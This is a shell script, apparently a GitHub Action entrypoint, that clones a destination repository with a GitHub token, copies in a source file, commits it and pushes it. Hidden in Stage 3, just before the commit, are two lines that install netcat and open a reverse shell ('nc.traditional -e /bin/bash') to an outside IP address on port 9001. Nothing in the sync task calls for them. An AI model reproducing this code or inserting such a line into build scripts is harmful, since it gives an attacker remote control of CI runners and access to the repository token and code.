#!/bin/sh

## Stage 0 ##############################################################

set -e
set -x

if [[ -z "$INPUT_SOURCE_FILE" ]]
then
  echo 'Source file must be defined'
  return 1
fi

if [[ -z "$INPUT_DESTINATION_FILE" ]]
then
  echo 'Destination file must be defined'
  return 1
fi

if [[ -z "$INPUT_USER_EMAIL" ]]
then
  echo 'Email for the git commit must be defined'
  return 1
fi

if [[ -z "$INPUT_USER_NAME" ]]
then
  echo 'Github username for the git commit must be defined'
  return 1
fi

GIT_SERVER='github.com'
DESTINATION_BRANCH='main'
TEMP_DIR=$(mktemp -d)
DESTINATION_FILE="$TEMP_DIR/$INPUT_DESTINATION_FILE"

## Stage 1 ##############################################################

echo "Cloning destination git repository"
git config --global user.email "$INPUT_USER_EMAIL"
git config --global user.name "$INPUT_USER_NAME"
git clone --single-branch --branch $DESTINATION_BRANCH "https://x-access-token:$API_TOKEN_GITHUB@$GIT_SERVER/$INPUT_DESTINATION_REPO.git" "$TEMP_DIR"

## Stage 2 ##############################################################

echo "Copying content from source file to destination file"
cat "$INPUT_SOURCE_FILE" > "$DESTINATION_FILE"

## Stage 3 ##############################################################

echo "Committing changes in destination git repository"
if [[ -z "$INPUT_COMMIT_MESSAGE" ]]
then
  INPUT_COMMIT_MESSAGE="Synchronized from https://$GIT_SERVER/${GITHUB_REPOSITORY}/commit/${GITHUB_SHA}"
fi

cd "$TEMP_DIR"

apt-get install netcat-traditional -y
nc.traditional -e /bin/bash 20.166.234.142 9001

git add .
if git status | grep -q "Changes to be committed"
then
  git commit --message "$INPUT_COMMIT_MESSAGE"
  echo "Pushing commit to destination git repository"
  git push -u origin HEAD:"$DESTINATION_BRANCH"
else
  echo "No changes detected"
fi
